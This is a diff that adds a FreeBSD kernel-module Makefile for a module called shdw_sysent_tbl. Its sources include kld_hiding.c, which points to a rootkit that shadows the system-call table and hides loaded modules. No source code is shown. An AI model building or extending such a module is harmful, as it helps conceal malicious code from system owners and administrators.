@@ -1,0 +1,14 @@
+.PATH: ${.CURDIR}/src/
+.OBJDIR: ${.CURDIR}/obj/
+PACKAGE=shdw_sysent_tbl
+# START DEBUG MODE
+DEBUG_FLAGS=-g
+COPTFLAGS=-O0
+CFLAGS=-O0 -pipe
+CFLAGS+=-DDEBUG
+# END DEBUG MODE
+FILESDIR=.
+KMOD=shdw_sysent_tbl
+SRCS=shdw_sysent_tbl.c kld_hiding.c
+
+.include <bsd.kmod.mk>
